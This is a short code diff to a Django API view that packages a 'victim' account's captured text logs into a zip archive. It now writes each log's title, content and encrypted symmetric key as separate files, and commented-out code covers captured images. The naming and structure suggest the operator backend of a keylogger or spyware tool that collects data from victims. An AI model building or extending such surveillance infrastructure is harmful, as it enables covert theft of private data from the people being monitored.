@@ -27,8 +27,14 @@ class DownloadLogAPI(generics.GenericAPIView):
         zip_file = BytesIO()
         with ZipFile(zip_file, 'w') as zip_obj:
             for i, text_log in enumerate(text_logs):
-                zip_obj.writestr('text_{}_{}_{}.txt'.format(
-                    victim_account.username, str(text_log.created_at), i), text_log.title+text_log.content)
+                file_name = 'text_{}_{}_{}'.format(
+                    victim_account.username, str(text_log.created_at), i)
+                zip_obj.writestr(file_name + '_title.txt',
+                                 text_log.title)
+                zip_obj.writestr(file_name + '_content.txt',
+                                 text_log.content)
+                zip_obj.writestr(file_name + '_key.txt',
+                                 text_log.encrypted_sym_key)
             # for i, image_log in enumerate(image_logs):
             #     zip_obj.writestr('image_{}_{}_{}.jpeg'.format(
             #         victim_account.username, str(image_log.created_at), i), image_log.image)
